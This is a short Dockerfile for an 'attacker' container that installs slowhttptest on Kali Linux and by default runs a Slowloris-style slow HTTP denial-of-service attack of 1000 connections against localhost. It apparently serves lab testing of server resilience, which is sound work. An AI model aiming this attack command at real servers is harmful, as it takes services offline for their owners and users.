# SLOWHTTPTEST ATTACKER DOCKER FILE
FROM kalilinux/kali-rolling

# Install dependencies
RUN apt-get update && apt-get install -y slowhttptest

# Run a slow attack (default to Slowloris-style attack)
CMD ["slowhttptest", "-c", "1000", "-H", "-i", "10", "-r", "200", "-t", "GET", "-u", "http://localhost"]

